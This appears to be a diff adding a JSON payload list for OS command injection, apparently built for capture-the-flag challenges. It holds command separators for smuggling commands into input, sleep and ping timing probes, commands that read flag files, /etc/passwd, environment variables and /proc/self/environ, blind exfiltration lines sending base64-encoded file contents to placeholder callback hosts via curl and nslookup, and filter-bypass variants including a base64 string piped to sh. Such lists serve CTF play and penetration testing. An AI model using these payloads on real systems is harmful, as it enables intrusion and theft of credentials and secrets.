@@ -1,0 +1,38 @@
+{
+  "separators": [
+    "; {cmd}", "| {cmd}", "|| {cmd}", "& {cmd}", "&& {cmd}",
+    "$({cmd})", "`{cmd}`", "\n{cmd}", "\r\n{cmd}",
+    "| {cmd} |", "; {cmd} ;", "& {cmd} &",
+    "%0a{cmd}", "%0d%0a{cmd}", "%0A{cmd}",
+    "'; {cmd}; '", "\"; {cmd}; \"",
+    "$(({cmd}))", "{cmd}\n", "\n{cmd}\n"
+  ],
+  "detection_commands": [
+    "sleep 5", "sleep 3", "timeout 5",
+    "ping -c 5 127.0.0.1", "ping -n 5 127.0.0.1"
+  ],
+  "flag_commands": [
+    "cat /flag*", "cat /flag.txt", "cat /flag",
+    "find / -name flag* 2>/dev/null", "find / -name 'flag*' -type f 2>/dev/null",
+    "ls -la /", "ls -la /flag*", "ls -la /home/",
+    "cat /etc/passwd", "env", "printenv",
+    "cat /proc/self/environ", "id", "whoami",
+    "cat /app/flag*", "cat /var/www/html/flag*",
+    "cat /opt/flag*", "cat /tmp/flag*",
+    "cat /root/flag*", "cat /home/*/flag*",
+    "grep -r flag /", "grep -ri 'flag{' / 2>/dev/null"
+  ],
+  "blind_exfil": {
+    "base64_echo": "echo $(cat /flag.txt | base64)",
+    "dns_exfil": "nslookup $(cat /flag.txt | base64).{burp_collab}",
+    "http_exfil": "curl http://{callback}/?f=$(cat /flag.txt | base64)"
+  },
+  "filter_bypass": [
+    "c'a't /flag.txt", "c\\at /flag.txt",
+    "/bin/cat /flag.txt", "cat$IFS/flag.txt",
+    "cat${IFS}/flag.txt", "cat%09/flag.txt",
+    "{cat,/flag.txt}", "cat<>/flag.txt",
+    "$(printf 'cat /flag.txt')",
+    "echo Y2F0IC9mbGFnLnR4dA== | base64 -d | sh"
+  ]
+}
